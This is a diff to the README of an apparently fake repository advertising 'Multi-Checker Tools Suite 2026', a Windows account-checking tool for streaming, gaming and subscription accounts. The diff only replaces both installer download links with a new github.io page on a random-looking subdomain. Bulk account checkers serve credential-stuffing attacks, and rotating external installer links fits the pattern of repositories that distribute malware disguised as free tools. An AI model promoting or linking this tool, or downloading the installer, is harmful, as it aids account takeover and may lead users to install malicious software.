@@ -2,7 +2,7 @@
 
 Multi-Checker Tools Suite 2026 is your go-to solution for checking accounts across various platforms, including streaming services, gaming accounts, and premium subscriptions. This all-in-one tool is designed for Windows 10/11 users, offering a seamless and efficient way to verify account validity and status. With support for multiple services and a user-friendly interface, it streamlines the verification process for personal or organizational use.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -61,7 +61,7 @@ No, there are no imposed limits on daily checks. However, it's advisable to use 
 
 For the latest version and all updates, visit the official download page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ## Disclaimer
 
